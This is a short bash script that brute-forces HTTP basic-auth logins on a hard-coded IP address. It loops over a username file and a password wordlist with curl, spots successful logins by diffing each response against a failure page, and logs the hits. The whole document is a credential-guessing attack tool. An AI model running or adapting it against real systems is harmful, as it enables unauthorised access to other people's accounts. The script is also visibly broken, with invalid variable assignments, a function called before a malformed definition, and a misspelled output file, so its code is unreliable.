#!/bin/bash

list=~/facebook-firstnames.txt
URL=http://142.1.44.135:8000/login

echo; echo "-----------Starting Script----------------"; echo;

touch ~/active_passwords.txt
touch ~/.temp_html
curl -u "$username:$password" "$URL" > ~/.invalid_refhtml # need to add arg: --socks5 127.0.0.1 if local
$temp_page=~/.temp_html
$invalid_reference=~/.invalid_refhtml # reference to compare curl command output against 

usernames_bank=$1 # the text file containing valid usernames
word_list=$2 # the path to the wordlist to be used on each username.

while IFS= read -r name; do
    username=`echo "$name" | tr -d \\n`;
    echo "---Checking for username: $name"---;
    process_list
done < "$usernames_bank"

echo; echo "------------Ending Script-------------------"; echo;

process_list {

while IFS= read -r line; do
    password=`echo "$line" | tr -d \\n`;
    curl -u "$username:$password" "$URL" > ~/.temp_html # need to add arg: --socks5 127.0.0.1 if local
    output=`diff $temp_page $invalid_reference`;
    if [[ "$output" == "" ]]; then
        echo "username: $password INCORECT!";
    else
        echo "$username" >> ~/active_paswords.txt;
        echo "username: $password is CORRECT!!!!!!!";
        echo; echo;
    fi
done < "$word_list"



}